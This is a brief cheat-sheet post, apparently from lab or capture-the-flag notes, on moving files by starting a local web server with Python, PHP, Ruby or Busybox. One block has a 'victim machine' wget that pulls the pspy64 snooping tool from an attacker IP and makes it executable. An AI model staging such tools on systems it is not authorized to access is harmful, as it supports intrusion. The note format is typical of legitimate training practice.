---
description: >-
  File transfer via web server.
title: Local Web Server                 # Add title here
date: 2022-09-05 08:00:00 -0600                           # Change the date to match completion date
categories: [03 File Transfer, Linux - Local Web Server]                     # Change Templates to Writeup
tags: [file transfer, linux web server]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---
### Python3
Via web:

```bash
# On our machine:
python3 -m http.server 8888

# On victim machine:

wget http://10.10.16.5:8888/pspy64
chmod +x pspy64
```

### Python2
```bash 
python -m SimpleHTTPServer 7331
```

### PHP
```bash
php -S 0.0.0.0:8080
```

### Ruby
```bash
ruby -run -e httpd . -p 9000
```

### Busybox
```bash
busybox httpd -f -p 10000
```